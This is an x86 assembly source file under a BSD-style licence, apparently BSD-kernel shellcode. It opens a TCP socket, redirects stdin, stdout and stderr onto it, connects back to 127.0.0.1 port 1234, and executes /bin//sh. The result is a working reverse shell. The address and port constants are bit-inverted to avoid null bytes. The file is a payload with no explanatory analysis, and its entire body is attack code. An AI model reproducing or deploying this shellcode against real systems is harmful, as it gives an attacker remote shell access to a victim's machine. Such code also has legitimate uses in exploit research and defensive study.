;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    
    bits   32
    
    mov    eax, ~0x0100007f & 0xFFFFFFFF
    mov    edx, ~0xD2040200 & 0xFFFFFFFF
    not    eax
    not    edx
    push   eax          ; sa.sin_addr = inet_addr("127.0.0.1")
    push   edx          ; sa.sin_port = 1234, sa.sin_family=AF_INET
    mov    edi, esp     ; edi = &sa

    ; step 1, create a socket
    ; socket (AF_INET, SOCK_STREAM, IPPROTO_IP);
    push   97
    pop    eax
    cdq
    push   edx          ; IPPROTO_IP
    inc    edx
    push   edx          ; SOCK_STREAM
    inc    edx
    push   edx          ; AF_INET
    push   edx          ; 
    int    0x80

    xchg   eax, ebx
    
    ; step 2, assign socket to stdin, stdout and stderr
    ; dup2 (s, STDIN_FILENO)
    ; dup2 (s, STDOUT_FILENO)
    ; dup2 (s, STDERR_FILENO)
    push   ebx
    push   16
dup_loop:
    push   90           ; eax=sys_dup2
    pop    eax
    int    0x80
    dec    dword[esp+8]
    jns    dup_loop
    
    ; step 3, connect to remote host
    ; connect (s, {AF_INET, 1234, 127.0.0.1}, 16);
    push   edi        ; &sa
    push   ebx        ; s  
    push   eax        ; 0
    mov    al, 98
    int    0x80
    
    ; step 4, execute shell
    ; execve ("/bin//sh", {"/bin//sh", NULL}, 0);
    push   eax         ; '\0'
    push   '//sh'
    push   '/bin'
    mov    ebx, esp    ; ebx = "/bin//sh", 0
    push   eax         ; NULL
    push   ebx         ; "/bin//sh", 0
    mov    ecx, esp
    push   eax
    push   ecx
    push   ebx         ; "/bin//sh", 0
    push   eax         
    mov    al, 0x3b    ; eax = sys_execve
    int    0x80
    